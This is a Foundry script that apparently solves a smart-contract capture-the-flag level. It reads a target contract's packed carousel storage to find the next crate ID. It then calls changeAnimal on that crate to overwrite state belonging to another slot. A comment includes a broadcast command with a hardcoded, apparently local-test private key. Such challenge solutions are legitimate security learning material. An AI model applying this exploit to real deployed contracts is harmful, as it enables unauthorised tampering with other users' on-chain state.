// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function encodeAnimalName(string calldata animalName) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
    function carousel(uint256 crateId) external view returns (uint256);
}

contract SolveScript is Script {
    address public target = 0x524F04724632eED237cbA3c37272e018b3A7967e;
    uint16 public MAX_CAPACITY = type(uint16).max;                 // 0x000000000000000000000000000000000000000000000000000000000000ffff
    uint256 ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;   // 0xffffffffffffffffffff00000000000000000000000000000000000000000000
    uint256 NEXT_ID_MASK = uint256(type(uint16).max) << 160;       // 0x00000000000000000000ffff0000000000000000000000000000000000000000
    uint256 OWNER_MASK = uint256(type(uint160).max);               // 0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff


    function setUp() public {}

    // forge script -vv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();

        ITarget t = ITarget(target);

        uint256 curr = t.currentCrateId();
        uint256 slot = t.carousel(curr);
        uint256 nextCrateId = (slot & NEXT_ID_MASK) >> 160;

        console.log("currentCrateId :", curr);
        console.log("nextCrateId    :", nextCrateId);

        t.changeAnimal("ZZZ", nextCrateId);

        slot = t.carousel(nextCrateId);
        console.log("Slot 1 state after change:", slot);

        vm.stopBroadcast();
    }
}
